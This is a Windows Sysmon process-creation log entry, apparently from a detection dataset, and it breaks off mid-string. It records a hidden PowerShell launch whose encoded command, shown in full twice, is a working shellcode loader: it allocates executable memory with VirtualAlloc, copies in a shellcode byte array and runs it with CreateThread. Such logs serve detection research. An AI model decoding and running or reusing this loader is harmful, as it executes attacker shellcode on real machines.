                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-D240-6462-3206-000000004400}; ProcessId=7976; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-D240-6462-3006-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DBA3E6449E97D4E3DF64527EF7012A10,SHA256=E0C662D10B852B23F2D8A240AFC82A72B099519FA71CDDF9D5D0F0BE08169B6E,IMPHASH=D1A922C94A1F407CB2BBCAD033C8ED7A; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7896; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=powershell  -window hidden -EncodedCommand JABiAEsAegAgAD0AIAAnACQAWQBRAGcAYwAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAAgAHUAaQBuAHQAIABmAGwAUAByAG8AdABlAGMAdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAG0AcwB2AGMAcgB0AC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABtAGUAbQBzAGUAdAAoAEkAbgB0AFAAdAByACAAZABlAHMAdAAsACAAdQBpAG4AdAAgAHMAcgBjACwAIAB1AGkAbgB0ACAAYwBvAHUAbgB0ACkAOwAnACcAOwAkAHcAIAA9ACAAQQBkAGQALQBUAHkAcABlACAALQBtAGUAbQBiAGUAcgBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJABZAFEAZwBjACAALQBOAGEAbQBlACAAIgBXAGkAbgAzADIAIgAgAC0AbgBhAG0AZQBzAHAAYQBjAGUAIABXAGkAbgAzADIARgB1AG4AYwB0AGkAbwBuAHMAIAAtAHAAYQBzAHMAdABoAHIAdQA7AFsAQgB5AHQAZQBbAF0AXQA7AFsAQgB5AHQAZQBbAF0AXQAkAHoAIAA9ACAAMAB4AGIAZAAsADAAeABmAGYALAAwAHgAOAA3ACwAMAB4ADcAZAAsADAAeAAyADIALAAwAHgAZAA5ACwAMAB4AGMAMAAsADAAeABkADkALAAwAHgANwA0ACwAMAB4ADIANAAsADAAeABmADQALAAwAHgANQBiACwAMAB4ADIAOQAsADAAeABjADkALAAwAHgAYgAxACwAMAB4ADUAYQAsADAAeAAzADEALAAwAHgANgBiACwAMAB4ADEANAAsADAAeAA4ADMALAAwAHgAZQBiACwAMAB4AGYAYwAsADAAeAAwADMALAAwAHgANgBiACwAMAB4ADEAMAAsADAAeAAxAGQALAAwAHgANwAyACwAMAB4ADgAMQAsADAAeABjAGEALAAwAHgANgAzACwAMAB4ADcAZAAsADAAeAA3AGEALAAwAHgAMABiACwAMAB4ADAAMwAsADAAeABmADcALAAwAHgAOQBmACwAMAB4ADMAYQAsADAAeAAwADMALAAwAHgANgAzACwAMAB4AGUAYgAsADAAeAA2AGQALAAwAHgAYgAzACwAMAB4AGUANwAsADAAeABiADkALAAwAHgAOAAxACwAMAB4ADMAOAAsADAAeABhADUALAAwAHgAMgA5ACwAMAB4ADEAMQAsADAAeAA0AGMALAAwAHgANgAyACwAMAB4ADUAZAAsADAAeAA5ADIALAAwAHgAZgBhACwAMAB4ADUANAAsADAAeAA1ADAALAAwAHgAMgAzACwAMAB4ADUANgAsADAAeABhADQALAAwAHgAZgAzACwAMAB4AGEANwAsADAAeABhADQALAAwAHgAZgA5ACwAMAB4AGQAMwAsADAAeAA5ADYALAAwAHgANgA3ACwAMAB4ADAAYwAsADAAeAAxADUALAAwAHgAZABlACwAMAB4ADkANQAsADAAeABmAGQALAAwAHgANAA3ACwAMAB4AGIANwAsADAAeABkADIALAAwAHgANQAwACwAMAB4ADcAOAAsADAAeABiAGMALAAwAHgAYQBlACwAMAB4ADYAOAAsADAAeABmADMALAAwAHgAOABlACwAMAB4ADMAZgAsADAAeABlADkALAAwAHgAZQAwACwAMAB4ADQANwAsADAAeAAzAGUALAAwAHgAZAA4ACwAMAB4AGIANgAsADAAeABkAGMALAAwAHgAMQA5ACwAMAB4AGYAYQAsADAAeAAzADkALAAwAHgAMwAwACwAMAB4ADEAMgAsADAAeABiADMALAAwAHgAMgAxACwAMAB4ADUANQAsADAAeAAxAGUALAAwAHgAMABkACwAMAB4AGQAOQAsADAAeABhAGQALAAwAHgAZAA1ACwAMAB4ADgAYwAsADAAeAAwAGIALAAwAHgAZgBjACwAMAB4ADEANgAsADAAeAAyADIALAAwAHgANwAyACwAMAB4ADMAMAAsADAAeABlADUALAAwAHgAMwBhACwAMAB4AGIAMgAsADAAeABmADcALAAwAHgAMQA1ACwAMAB4ADQAOQAsADAAeABjAGEALAAwAHgAMABiACwAMAB4AGEAOAAsADAAeAA0AGEALAAwAHgAMAA5ACwAMAB4ADcAMQAsADAAeAA3ADYALAAwAHgAZABlACwAMAB4ADgAYQAsADAAeABkADEALAAwAHgAZgBkACwAMAB4ADcAOAAsADAAeAA3ADcALAAwAHgAZQAzACwAMAB4AGQAMgAsADAAeAAxAGYALAAwAHgAZgBjACwAMAB4AGUAZgAsADAAeAA5AGYALAAwAHgANQA0ACwAMAB4ADUAYQAsADAAeABlAGMALAAwAHgAMQBlACwAMAB4AGIAOAAsADAAeABkADAALAAwAHgAMAA4ACwAMAB4AGEAYgAsADAAeAAzAGYALAAwAHgAMwA3ACwAMAB4ADkAOQAsADAAeABlAGYALAAwAHgAMQBiACwAMAB4ADkAMwAsADAAeABjADEALAAwAHgAYgA0ACwAMAB4ADAAMgAsADAAeAA4ADIALAAwAHgAYQBmACwAMAB4ADEAYgAsADAAeAAzAGEALAAwAHgAZAA0ACwAMAB4ADAAZgAsADAAeABjADQALAAwAHgAOQBlACwAMAB4ADkAZQAsADAAeABhADIALAAwAHgAMQAxACwAMAB4ADkAMwAsADAAeABmAGMALAAwAHgAYQBhACwAMAB4ADgAYgAsADAAeABjADkALAAwAHgAOABhACwAMAB4ADIAYQAsADAAeAAzAGIALAAwAHgANgA1ACwAMAB4ADEAYQAsADAAeAA0ADUALAAwAHgAZAAyACwAMAB4AGQAZAAsADAAeABiADQALAAwAHgAZAA1ACwAMAB4ADUAMwAsADAAeABmADgALAAwAHgANAAzACwAMAB4ADEAOQAsADAAeAA0AGUALAAwAHgAMwA1ACwAMAB4ADkANwAsADAAeABiADYALAAwAHgAMgAzACwAMAB4ADYANQAsADAAeAA3ADQALAAwAHgANgBhACwAMAB4AGEAYgAsADAAeABiADMALAAwAHgAMgBjACwAMAB4AGYANQAsADAAeAA4AGMALAAwAHgAMwBiACwAMAB4ADAANQAsADAAeAA1ADYALAAwAHgAOAAxACwAMAB4AGEAOQAsADAAeABhADUALAAwAHgAMABhACwAMAB4ADcANgAsADAAeAA0ADYALAAwAHgANAA2ACwAMAB4AGIAMAAsADAAeAA3ADgALAAwAHgAOQA2ACwAMAB4ADcAZQAsADAAeAA0ADUALAAwAHgANwA4ACwAMAB4ADkANgAsADAAeAA3AGUALAAwAHgANwA5ACwAMAB4ADQAYQAsADAAeABhAGUALAAwAHgANABjACwAMAB4AGYAYwAsADAAeABlAGQALAAwAHgAYwBlACwAMAB4AGUAMAAsADAAeAA5ADYALAAwAHgAYQA2ACwAMAB4ADQANwAsADAAeAA5AGYALAAwAHgAYQAxACwAMAB4AGIANwAsADAAeAA4AGQALAAwAHgAMgA5ACwAMAB4AGUAYgAsADAAeAAxADQALAAwAHgANAA2ACwAMAB4ADIAYQAsADAAeABjADYALAAwAHgANwBhACwAMAB4ADEAMgAsADAAeAA3ADkALAAwAHgANwA1ACwAMAB4ADIAOQAsADAAeAA0AGMALAAwAHgAMgBkACwAMAB4ADIAZgAsADAAeABhADUALAAwAHgAOQA5ACwAMAB4ADgANAAsADAAeABlADEALAAwAHgAMABlACwAMAB4AGEAMQAsADAAeABmADIALAAwAHgANgA4ACwAMAB4ADEAYQAsADAAeAA1ADcALAAwAHgAYQAyACwAMAB4AGYAYwAsADAAeAA1AGEALAAwAHgANQA0ACwAMAB4ADUAYwAsADAAeABmAGQALAAwAHgAZAAzACwAMAB4ADcAYgAsADAAeAAzADYALAAwAHgAZgA5ACwAMAB4AGIAMwAsADAAeAAxADEALAAwAHgAZAA4ACwAMAB4ADUANwAsADAAeAA1AGIALAAwAHgAOQAzACwAMAB4AGEAMAAsADAAeABjADkALAAwAHgAMQBkACwAMAB4AGEANAAsADAAeABmADgALAAwAHgAYQA1ACwAMAB4ADcAMgAsADAAeAAwADgALAAwAHgANQAwACwAMAB4ADEAYwAsADAAeAAxAGMALAAwAHgAOAAzACwAMAB4ADUAMAAsADAAeABiADgALAAwAHgAYQA3ACwAMAB4ADIANAAsADAAeAA4ADkALAAwAHgAMwBkACwAMAB4ADkANwAsADAAeABhAGUALAAwAHgAMwA4ACwAMAB4ADcAMQAsADAAeAA2ADIALAAwAHgAOAA4ACwAMAB4ADUANQAsADAAeAA3AGQALAAwAHgAMwA5ACwAMAB4ADgAOAAsADAAeABmADAALAAwAHgAOAAyACwAMAB4ADkANAAsADAAeABhADcALAAwAHgAYgBjACwAMAB4ADEANAAsADAAeAAxADYALAAwAHgAMgA4ACwAMAB4ADMAZAAsADAAeABlADUALAAwAHgANwBlACwAMAB4ADQAOAAsADAAeAAzAGQALAAwAHgAYQA1ACwAMAB4ADcAZQAsADAAeAAxAGIALAAwAHgANQA1ACwAMAB4ADcAZAAsADAAeABkAGEALAAwAHgAYwA4ACwAMAB4ADQAMAAsADAAeAA4ADIALAAwAHgAZgA3ACwAMAB4ADcAYwAsADAAeABkADkALAAwAHgAMgBlACwAMAB4ADcAZQAsADAAeAA2ADUALAAwAHgAOAA5ACwAMAB4AGIAOAAsADAAeAA4ADAALAAwAHgANABhACwAMAB4ADMANgAsADAAeAAzADkALAAwAHgAZAAzACwAMAB4AGQAYwAsADAAeAA1AGUALAAwAHgAMgBiACwAMAB4ADQANQAsADAAeAA2ADkALAAwAHgANwBjACwAMAB4AGIANAAsADAAeABiAGMALAAwAHgAZQBmACwAMAB4ADQAMQAsADAAeAAzAGYALAAwAHgAZgAzACwAMAB4ADcAYgAsADAAeAA0ADYALAAwAHgAYwAxACwAMAB4AGMAOAAsADAAeABmADkALAAwAHgAOAA5ACwAMAB4AGIANAAsADAAeAAyAGIALAAwAHgANQA5ACwAMAB4AGMAOQAsADAAeAA2ADgALAAwAHgANQBiACwAMAB4ADIAZgAsADAAeAAzADIALAAwAHgANgA5ACwAMAB4ADYANAAsADAAeABhADcALAAwAHgAYgBiACwAMAB4AGUAMQAsADAAeABiADQALAAwAHgAMwBiACwAMAB4ADIAMQAsADAAeAA3AGMALAAwAHgAYgBlACwAMAB4AGQAMgAsADAAeABjAGEALAAwAHgAZQA1ACwAMAB4ADEAMAAsADAAeAA0ADYALAAwAHgANgA1ACwAMAB4ADkANAAsADAAeAAwADMALAAwAHgAZQA1ACwAMAB4ADEAMAAsADAAeAA3ADUALAAwAHgAYQBlACwAMAB4ADgANQAsADAAeABmADQALAAwAHgAZQAxACwAMAB4ADMAMQAsADAAeAAxADIALAAwAHgANgBjACwAMAB4AGUAYQA7ACQAZwAgAD0AIAAwAHgAMQAwADAAMAA7AGkAZgAgACgAJAB6AC4ATABlAG4AZwB0AGgAIAAtAGcAdAAgADAAeAAxADAAMAAwACkAewAkAGcAIAA9ACAAJAB6AC4ATABlAG4AZwB0AGgAfQA7ACQAdQBSAG0ANQA9ACQAdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAGcALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABpAD0AMAA7ACQAaQAgAC0AbABlACAAKAAkAHoALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAaQArACsAKQAgAHsAJAB3ADoAOgBtAGUAbQBzAGUAdAAoAFsASQBuAHQAUAB0AHIAXQAoACQAdQBSAG0ANQAuAFQAbwBJAG4AdAAzADIAKAApACsAJABpACkALAAgACQAegBbACQAaQBdACwAIAAxACkAfQA7ACQAdwA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKAAwACwAMAAsACQAdQBSAG0ANQAsADAALAAwACwAMAApADsAZgBvAHIAIAAoADsAOwApAHsAUwB0AGEAcgB0AC0AcwBsAGUAZQBwACAANgAwAH0AOwAnADsAJABlACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAGIASwB6ACkAKQA7ACQAdgBEAEUAQgAgAD0AIAAiAC0ARQBuAGMAbwBkAGUAZABDAG8AbQBtAGEAbgBkACAAIgA7AGkAZgAoAFsASQBuAHQAUAB0AHIAXQA6ADoAUwBpAHoAZQAgAC0AZQBxACAAOAApAHsAJABwAHUAQgBoACAAPQAgACQAZQBuAHYAOgBTAHkAcwB0AGUAbQBSAG8AbwB0ACAAKwAgACIAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAiADsAaQBlAHgAIAAiACYAIAAkAHAAdQBCAGgAIAAkAHYARABFAEIAIAAkAGUAIgB9AGUAbABzAGUAewA7AGkAZQB4ACAAIgAmACAAcABvAHcAZQByAHMAaABlAGwAbAAgACQAdgBEAEUAQgAgACQAZQAiADsAfQA=; EventID=1; LogonGuid=C784477D-562A-6441-51C7-030000000000; LogonId=247633; Image=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c powershell -window hidden -EncodedCommand JABiAEsAegAgAD0AIAAnACQAWQBRAGcAYwAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAAgAHUAaQBuAHQAIABmAGwAUAByAG8AdABlAGMAdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAG0AcwB2AGMAcgB0AC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABtAGUAbQBzAGUAdAAoAEkAbgB0AFAAdAByACAAZABlAHMAdAAsACAAdQBpAG4AdAAgAHMAcgBjACwAIAB1AGkAbgB0ACAAYwBvAHUAbgB0ACkAOwAnACcAOwAkAHcAIAA9ACAAQQBkAGQALQBUAHkAcABlACAALQBtAGUAbQBiAGUAcgBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJABZAFEAZwBjACAALQBOAGEAbQBlACAAIgBXAGkAbgAzADIAIgAgAC0AbgBhAG0AZQBzAHAAYQBjAGUAIABXAGkAbgAzADIARgB1AG4AYwB0AGkAbwBuAHMAIAAtAHAAYQBzAHMAdABoAHIAdQA7AFsAQgB5AHQAZQBbAF0AXQA7AFsAQgB5AHQAZQBbAF0AXQAkAHoAIAA9ACAAMAB4AGIAZAAsADAAeABmAGYALAAwAHgAOAA3ACwAMAB4ADcAZAAsADAAeAAyADIALAAwAHgAZAA5ACwAMAB4AGMAMAAsADAAeABkADkALAAwAHgANwA0ACwAMAB4ADIANAAsADAAeABmADQALAAwAHgANQBiACwAMAB4ADIAOQAsADAAeABjADkALAAwAHgAYgAxACwAMAB4ADUAYQAsADAAeAAzADEALAAwAHgANgBiACwAMAB4ADEANAAsADAAeAA4ADMALAAwAHgAZQBiACwAMAB4AGYAYwAsADAAeAAwADMALAAwAHgANgBiACwAMAB4ADEAMAAsADAAeAAxAGQALAAwAHgANwAyACwAMAB4ADgAMQAsADAAeABjAGEALAAwAHgANgAzACwAMAB4ADcAZAAsADAAeAA3AGEALAAwAHgAMABiACwAMAB4ADAAMwAsADAAeABmADcALAAwAHgAOQBmACwAMAB4ADMAYQAsADAAeAAwADMALAAwAHgANgAzACwAMAB4AGUAYgAsADAAeAA2AGQALAAwAHgAYgAzACwAMAB4AGUANwAsADAAeABiADkALAAwAHgAOAAxACwAMAB4ADMAOAAsADAAeABhADUALAAwAHgAMgA5ACwAMAB4ADEAMQAsADAAeAA0AGMALAAwAHgANgAyACwAMAB4ADUAZAAsADAAeAA5ADIALAAwAHgAZgBhACwAMAB4ADUANAAsADAAeAA1ADAALAAwAHgAMgAzACwAMAB4ADUANgAsADAAeABhADQALAAwAHgAZgAzACwAMAB4AGEANwAsADAAeABhADQALAAwAHgAZgA5ACwAMAB4AGQAMwAsADAAeAA5ADYALAAwAHgANgA3ACwAMAB4ADAAYwAsADAAeAAxADUALAAwAHgAZABlACwAMAB4ADkANQAsADAAeABmAGQALAAwAHgANAA3ACwAMAB4AGIANwAsADAAeABkADIALAAwAHgANQAwACwAMAB4ADcAOAAsADAAeABiAGMALAAwAHgAYQBlACwAMAB4ADYAOAAsADAAeABmADMALAAwAHgAOABlACwAMAB4ADMAZgAsADAAeABlADkALAAwAHgAZQAwACwAMAB4ADQANwAsADAAeAAzAGUALAAwAHgAZAA4ACwAMAB4AGIANgAsADAAeABkAGMALAAwAHgAMQA5ACwAMAB4AGYAYQAsADAAeAAzADkALAAwAHgAMwAwACwAMAB4ADEAMgAsADAAeABiADMALAAwAHgAMgAxACwAMAB4ADUANQAsADAAeAAxAGUALAAwAHgAMABkACwAMAB4AGQAOQAsADAAeABhAGQALAAwAHgAZAA1ACwAMAB4ADgAYwAsADAAeAAwAGIALAAwAHgAZgBjACwAMAB4ADEANgAsADAAeAAyADIALAAwAHgANwAyACwAMAB4ADMAMAAsADAAeABlADUALAAwAHgAMwBhACwAMAB4AGIAMgAsADAAeABmADcALAAwAHgAMQA1ACwAMAB4ADQAOQAsADAAeABjAGEALAAwAHgAMABiACwAMAB4AGEAOAAsADAAeAA0AGEALAAwAHgAMAA5ACwAMAB4ADcAMQAsADAAeAA3ADYALAAwAHgAZABlACwAMAB4ADgAYQAsADAAeABkADEALAAwAHgAZgBkACwAMAB4ADcAOAAsADAAeAA3ADcALAAwAHgAZQAzACwAMAB4AGQAMgAsADAAeAAxAGYALAAwAHgAZgBjACwAMAB4AGUAZgAsADAAeAA5AGYALAAwAHgANQA0ACwAMAB4ADUAYQAsADAAeABlAGMALAAwAHgAMQBlACwAMAB4AGIAOAAsADAAeABkADAALAAwAHgAMAA4ACwAMAB4AGEAYgAsADAAeAAzAGYALAAwAHgAMwA3ACwAMAB4ADkAOQAsADAAeABlAGYALAAwAHgAMQBiACwAMAB4ADkAMwAsADAAeABjADEALAAwAHgAYgA0ACwAMAB4ADAAMgAsADAAeAA4ADIALAAwAHgAYQBmACwAMAB4ADEAYgAsADAAeAAzAGEALAAwAHgAZAA0ACwAMAB4ADAAZgAsADAAeABjADQALAAwAHgAOQBlACwAMAB4ADkAZQAsADAAeABhADIALAAwAHgAMQAxACwAMAB4ADkAMwAsADAAeABmAGMALAAwAHgAYQBhACwAMAB4ADgAYgAsADAAeABjADkALAAwAHgAOABhACwAMAB4ADIAYQAsADAAeAAzAGIALAAwAHgANgA1ACwAMAB4ADEAYQAsADAAeAA0ADUALAAwAHgAZAAyACwAMAB4AGQAZAAsADAAeABiADQALAAwAHgAZAA1ACwAMAB4ADUAMwAsADAAeABmADgALAAwAHgANAAzACwAMAB4ADEAOQAsADAAeAA0AGUALAAwAHgAMwA1ACwAMAB4ADkANwAsADAAeABiADYALAAwAHgAMgAzACwAMAB4ADYANQAsADAAeAA3ADQALAAwAHgANgBhACwAMAB4AGEAYgAsADAAeABiADMALAAwAHgAMgBjACwAMAB4AGYANQAsADAAeAA4AGMALAAwAHgAMwBiACwAMAB4ADAANQAsADAAeAA1ADYALAAwAHgAOAAxACwAMAB4AGEAOQAsADAAeABhADUALAAwAHgAMABhACwAMAB4ADcANgAsADAAeAA0ADYALAAwAHgANAA2ACwAMAB4AGIAMAAsADAAeAA3ADgALAAwAHgAOQA2ACwAMAB4ADcAZQAsADAAeAA0ADUALAAwAHgANwA4ACwAMAB4ADkANgAsADAAeAA3AGUALAAwAHgANwA5ACwAMAB4ADQAYQAsADAAeABhAGUALAAwAHgANABjACwAMAB4AGYAYwAsADAAeABlAGQALAAwAHgAYwBlACwAMAB4AGUAMAAsADAAeAA5ADYALAAwAHgAYQA2ACwAMAB4ADQANwAsADAAeAA5AGYALAAwAHgAYQAxACwAMAB4AGIANwAsADAAeAA4AGQALAAwAHgAMgA5ACwAMAB4AGUAYgAsADAAeAAxADQALAAwAHgANAA2ACwAMAB4ADIAYQAsADAAeABjADYALAAwAHgANwBhACwAMAB4ADEAMgAsADAAeAA3ADkALAAwAHgANwA1ACwAMAB4ADIAOQAsADAAeAA0AGMALAAwAHgAMgBkACwAMAB4ADIAZgAsADAAeABhADUALAAwAHgAOQA5ACwAMAB4ADgANAAsADAAeABlADEALAAwAHgAMABlACwAMAB4AGEAMQAsADAAeABmADIALAAwAHgANgA4ACwAMAB4ADEAYQAsADAAeAA1ADcALAAwAHgAYQAyACwAMAB4AGYAYwAsADAAeAA1AGEALAAwAHgANQA0ACwAMAB4ADUAYwAsADAAeABmAGQALAAwAHgAZAAzACwAMAB4ADcAYgAsADAAeAAzADYALAAwAHgAZgA5ACwAMAB4AGIAMwAsADAAeAAxADEALAAwAHgAZAA4ACwAMAB4ADUANwAsADAAeAA1AGIALAAwAHgAOQAzACwAMAB4AGEAMAAsADAAeABjADkALAAwAHgAMQBkACwAMAB4AGEANAAsADAAeABmADgALAAwAHgAYQA1ACwAMAB4ADcAMgAsADAAeAAwADgALAAwAHgANQAwACwAMAB4ADEAYwAsADAAeAAxAGMALAAwAHgAOAAzACwAMAB4ADUAMAAsADAAeABiADgALAAwAHgAYQA3ACwAMAB4ADIANAAsADAAeAA4ADkALAAwAHgAMwBkACwAMAB4ADkANwAsADAAeABhAGUALAAwAHgAMwA4ACwAMAB4ADcAMQAsADAAeAA2ADIALAAwAHgAOAA4ACwAMAB4ADUANQAsADAAeAA3AGQALAAwAHgAMwA5ACwAMAB4ADgAOAAsADAAeABmADAALAAwAHgAOAAyACwAMAB4ADkANAAsADAAeABhADcALAAwAHgAYgBjACwAMAB4ADEANAAsADAAeAAxADYALAAwAHgAMgA4ACwAMAB4ADMAZAAsADAAeABlADUALAAwAHgANwBlACwAMAB4ADQAOAAsADAAeAAzAGQALAAwAHgAYQA1ACwAMAB4ADcAZQAsADAAeAAxAGIALAAwAHgANQA1ACwAMAB4ADcAZAAsADAAeABkAGEALAAwAHgAYwA4ACwAMAB4ADQAMAAsADAAeAA4ADIALAAwAHgAZgA3ACwAMAB4ADcAYwAsADAAeABkADkALAAwAHgAMgBlACwAMAB4ADcAZQAsADAAeAA2ADUALAAwAHgAOAA5ACwAMAB4AGIAOAAsADAAeAA4ADAALAAwAHgANABhACwAMAB4ADMANgAsADAAeAAzADkALAAwAHgAZAAzACwAMAB4AGQAYwAsADAAeAA1AGUALAAwAHgAMgBiACwAMAB4ADQANQAsADAAeAA2ADkALAAwAHgANwBjACwAMAB4AGIANAAsADAAeABiAGMALAAwAHgAZQBmACwAMAB4ADQAMQAsADAAeAAzAGYALAAwAHgAZgAzACwAMAB4ADcAYgAsADAAeAA0ADYALAAwAHgAYwAxACwAMAB4AGMAOAAsADAAeABmADkALAAwAHgAOAA5ACwAMAB4AGIANAAsADAAeAAyAGIALAAwAHgANQA5ACwAMAB4AGMAOQAsADAAeAA2ADgALAAwAHgANQBiACwAMAB4ADIAZgAsADAAeAAzADIALAAwAHgANgA5ACwAMAB4ADYANAAsADAAeABhADcALAAwAHgAYgBiACwAMAB4AGUAMQAsADAAeABiADQALAAwAHgAMwBiACwAMAB4ADIAMQAsADAAeAA3AGMALAAwAHgAYgBlACwAMAB4AGQAMgAsADAAeABjAGEALAAwAHgAZQA1ACwAMAB4ADEAMAAsADAAeAA0ADYALAAwAHgANgA1ACwAMAB4ADkANAAsADAAeAAwADMALAAwAHgAZQA1ACwAMAB4ADEAMAAsADAAeAA3ADUALAAwAHgAYQBlACwAMAB4ADgANQAsADAAeABmADQALAAwAHgAZQAxACwAMAB4ADMAMQAsADAAeAAxADIALAAwAHgANgBjACwAMAB4AGUAYQA7ACQAZwAgAD0AIAAwAHgAMQAwADAAMAA7AGkAZgAgACgAJAB6AC4ATABlAG4AZwB0AGgAIAAtAGcAdAAgADAAeAAxADAAMAAwACkAewAkAGcAIAA9ACAAJAB6AC4ATABlAG4AZwB0AGgAfQA7ACQAdQBSAG0ANQA9ACQAdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAGcALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABpAD0AMAA7ACQAaQAgAC0AbABlACAAKAAkAHoALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAaQArACsAKQAgAHsAJAB3ADoAOgBtAGUAbQBzAGUAdAAoAFsASQBuAHQAUAB0AHIAXQAoACQAdQBSAG0ANQAuAFQAbwBJAG4AdAAzADIAKAApACsAJABpACkALAAgACQAegBbACQAaQBdACwAIAAxACkAfQA7ACQAdwA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKAAwACwAMAAsACQAdQBSAG0ANQAsADAALAAwACwAMAApADsAZgBvAHIAIAAoADsAOwApAHsAUwB0AGEAcgB0AC0AcwBsAGUAZQBwACAANgAwAH0AOwAnADsAJABlACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAGIASwB6ACkAKQA7ACQAdgBEAEUAQgAgAD0AIAAiAC0ARQBuAGMAbwBkAGUAZABDAG8AbQBtAGEAbgBkACAAIgA7AGkAZgAoAFsASQBuAHQAUAB0AHIAXQA6ADoAUwBpAHoAZQAgAC0AZQBxACAAOAApAHsAJABwAHUAQgBoACAAPQAgACQAZQBuAHYAOgBTAHkAcwB0AGUAbQBSAG8AbwB0ACAAKwAgACIAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAb